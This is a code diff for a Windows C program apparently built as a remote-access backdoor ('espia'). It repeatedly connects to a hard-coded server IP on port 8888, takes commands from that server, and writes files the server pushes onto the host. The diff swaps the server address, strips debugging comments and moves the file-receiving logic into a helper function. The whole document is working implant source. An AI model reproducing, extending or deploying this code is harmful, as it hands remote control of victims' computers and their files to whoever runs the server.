@@ -20,43 +20,11 @@ int main() {
 	ShowWindow(stealth, SW_NORMAL);
     /* ------------------------------------------- */
 
-    //wchar_t testarr[3] = L"ab";
-    //char chararr[6] = "\x61\x00\x62\x00\x00";
-    //printf("%ls, %d, %d\n", testarr, wcslen(testarr), sizeof(testarr));
-    //for (int i = 0 ; i < sizeof(testarr) ; i++) printf("[%c]", *(((char *)testarr) + i));
-    //printf("\n");
-    //for (int i = 0 ; i < sizeof(testarr) ; i++) printf("[%c]", *(testarr + i));
-    //printf("\n");
-    //for (int i = 0 ; i < sizeof(testarr) ; i++) printf("[%02x]", *(((char *)testarr) + i));
-    //printf("\n");
-    //printf("%ls, %d, %d\n", (wchar_t *)chararr, wcslen((wchar_t *)chararr), sizeof(chararr));
-    //for (int i = 0 ; i < sizeof(chararr) ; i++) printf("[%c]", *(((char *)chararr) + i));
-    //printf("\n");
-    //for (int i = 0 ; i < sizeof(chararr) ; i++) printf("[%c]", *(chararr + i));
-    //printf("\n");
-    //for (int i = 0 ; i < sizeof(chararr) ; i++) printf("[%02x]", *(((char *)chararr) + i));
-    //printf("\n");
-    //char norm[6] = "abcd";
-    //printf("%ls, %d, %d\n", chararr, strlen(chararr), sizeof(chararr));
-    //for (int i = 0 ; i < sizeof(norm) ; i++) printf("[%c]", *(((char *)norm) + i));
-    //printf("\n");
-    //for (int i = 0 ; i < sizeof(norm) ; i++) printf("[%c]", *(norm + i));
-    //printf("\n");
-    //for (int i = 0 ; i < sizeof(norm) ; i++) printf("[%02x]", *(((char *)norm) + i));
-    //printf("\n");
-    //char chararr[6] = "\x61\x00\x62\x00\x00";
-    //HANDLE hfile = CreateFileW((WCHAR *)chararr, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-    //char chararr[] = "\x61\x00\x62\x00\x20\x00\x63\x00\x64\x00\x00";
-    //for (int i = 0 ; i < wcslen((WCHAR *)chararr) ; i++) {
-        //printf("[%lc] %d\n", *(((WCHAR *)chararr) + i), (*(((WCHAR *)chararr) + i) == L' '));
-    //}
-
     /* Keep trying to connect to the server */
 	WORD server_status;
-	while ((server_status = espia_connect("172.25.253.11", "8888")) == CONNECTION_FAIL)
+	while ((server_status = espia_connect("172.30.225.91", "8888")) == CONNECTION_FAIL)
 		Sleep(TRY_SERVER);
     /* ------------------------------------ */
-
 
     /* Main flow of the program, command recieving, parsing */
     CHAR recv_buff[BUFF_SIZE];
@@ -105,50 +73,7 @@ int main() {
                 espia_send(err_buff, wcslen(err_buff)*sizeof(WCHAR));
             }
         } else if (wcscmp(cmd_buff, L"upload") == 0) {
-            WCHAR send_buff[9] = L"\0";
-            CHAR write_file_buff[1024] = "\0";
-            espia_recv(write_file_buff, sizeof(write_file_buff));
-
-            /* Converts the file size to int */
-            int sum = 0, dig = 0, pow = strlen(write_file_buff) - 1;
-            for (int i = 0 ; i < strlen(write_file_buff) ; i++) {
-                dig = write_file_buff[i] - '0';
-                for (int j = 0 ; j < pow ; j++)
-                    dig *= 10;
-                sum += dig;
-                pow--;
-            }
-
-            StringCbCatW(send_buff, sizeof(send_buff), L"ack<end>");
-            espia_send(send_buff, sizeof(send_buff));
-
-            HANDLE hFile = CreateFileW(
-                cmd_arg,     // Filename
-                GENERIC_WRITE,          // Desired access
-                FILE_SHARE_READ,        // Share mode
-                NULL,                   // Security attributes
-                CREATE_NEW,             // Creates a new file, only if it doesn't already exist
-                FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
-                NULL);                  // Template file handle
-            DWORD bytesWritten;
-            DWORD sizeWritten = 0;
-            if (hFile == INVALID_HANDLE_VALUE) {
-                // Failed to open/create file
-                return 2;
-            }
-
-            int recieved_bytes = 0, full_bytes = 0;
-            memset(write_file_buff, 0, sizeof(write_file_buff));
-            while (full_bytes != sum) {
-                recieved_bytes = espia_recv(write_file_buff, sizeof(write_file_buff));
-                WriteFile(
-                    hFile,            // Handle to the file
-                    write_file_buff,  // Buffer to write
-                    recieved_bytes,   // Buffer size
-                    NULL,    // Bytes written
-                    nullptr);
-                full_bytes += recieved_bytes;
-            }
+            download_file(cmd_arg , espia_recv, espia_send);
             continue;
         } else {
             espia_send(recv_buffw, cmd_size);
